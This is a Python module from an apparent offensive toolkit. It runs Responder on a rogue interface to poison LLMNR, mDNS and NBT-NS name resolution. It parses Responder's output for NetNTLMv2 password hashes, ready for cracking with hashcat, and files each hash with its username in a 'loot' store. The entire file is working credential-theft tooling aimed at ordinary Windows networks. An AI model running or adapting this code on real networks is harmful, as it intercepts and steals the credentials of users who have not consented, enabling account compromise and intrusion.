"""MITM engine: Responder-driven LLMNR / mDNS / NBT-NS poisoning.

Runs Responder across the rogue interface and streams every captured NetNTLMv2
hash (hashcat-ready) into the loot vault. Logs the responder stream to the
state dir so the dashboard can tail it. The portal holds :80, so Responder's
HTTP/WPAD channels can't bind (responder logs that and keeps SMB/LLMNR/mDNS
capture running) — Windows SMB hashes still stream unimpeded.
"""

import os
import re
import subprocess
import threading
import time

from . import config
from . import state

_ANSI_RE = re.compile(r'\x1b\[[0-9;]*[A-Za-z]')

# Responder never prints the hash with a "+/-" marker: the line is
#   [SMBD] NTLMv2-SSP Hash     : user::domain:challenge:proof:blob
#   [HTTP] NTLMv2 Hash         : user::domain:...
# The [module] bracket is wrapped in ANSI colour even when piped, so strip
# escapes first. NetNTLMv1 (and the NTLMv1-SSP variants) stay out: hashcat
# expects only -m 5600 ready tokens here.
_TOK_RE = re.compile(r'\[[^]]*\]\s*(?:Net)?NTLMv2(?:-SSP)?\s+Hash\s*:\s*(\S+)')


def _extract_token(line):
    """Return the hashcat-ready NetNTLMv2 token from a responder output line."""
    m = _TOK_RE.search(_ANSI_RE.sub('', line or ''))
    return m.group(1) if m else None


class MitmEngine(object):
    def __init__(self):
        self._lock = threading.Lock()
        self._proc = None
        self._reader = None
        self.tail = []
        self.iface = ''

    def running(self):
        with self._lock:
            return self._proc is not None and self._proc.poll() is None

    def start(self, iface=None):
        iface = iface or config.MITM_IFACE or ''
        with self._lock:
            if self._proc and self._proc.poll() is None:
                self.iface = iface or self.iface
                return {'ok': 1, 'running': True}
            if not iface:
                return {'ok': 0, 'error': 'no interface (arm the chain first)'}
            try:
                self._proc = subprocess.Popen(
                    [config.RESPONDER_BIN, '-I', iface, '-v'],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    stdin=subprocess.DEVNULL,
                    env=dict(os.environ, PYTHONUNBUFFERED='1'),
                    text=True)
            except Exception as exc:
                state.emit('ALERT', 'responder failed to start: %s' % exc)
                self._proc = None
                return {'ok': 0, 'error': str(exc)}
            self.iface = iface
            self._reader = threading.Thread(target=self._read_loop, daemon=True)
            self._reader.start()
        state.emit('MITM', 'LLMNR/mDNS/NBT-NS poisoning on %s (responder)' % iface)
        return {'ok': 1, 'running': True}

    def stop(self):
        with self._lock:
            proc = self._proc
            self._proc = None
        if proc:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        state.emit('MITM', 'LLMNR/mDNS/NBT-NS poisoning stopped')
        return {'ok': 1}

    def _read_loop(self):
        seen = set()
        while True:
            with self._lock:
                proc = self._proc
                if proc is None:
                    return
            line = proc.stdout.readline() if proc.stdout else ''
            if not line:
                time.sleep(0.4)
                if proc.poll() is not None:
                    break
                continue
            line = line.rstrip('\n')
            self.tail.append(line)
            del self.tail[:-300]
            with open(state.MITM_LOG, 'a') as fh:
                fh.write(line + '\n')
            token = _extract_token(line)
            if token:
                if token not in seen:
                    seen.add(token)
                    state.append_hash({
                        'ts': time.strftime('%Y-%m-%d %H:%M:%S UTC'),
                        'kind': 'ntlmv2',
                        'src': self.iface,
                        'token': token,
                        'user': token.split('::', 1)[0],
                    })
                    state.emit('HASH', 'NetNTLMv2 hash: %s' % token)
                    state.mirror_loot()
        state.emit('MITM', 'responder exited (%d)' % (proc and proc.returncode or 0))
        with self._lock:
            self._proc = None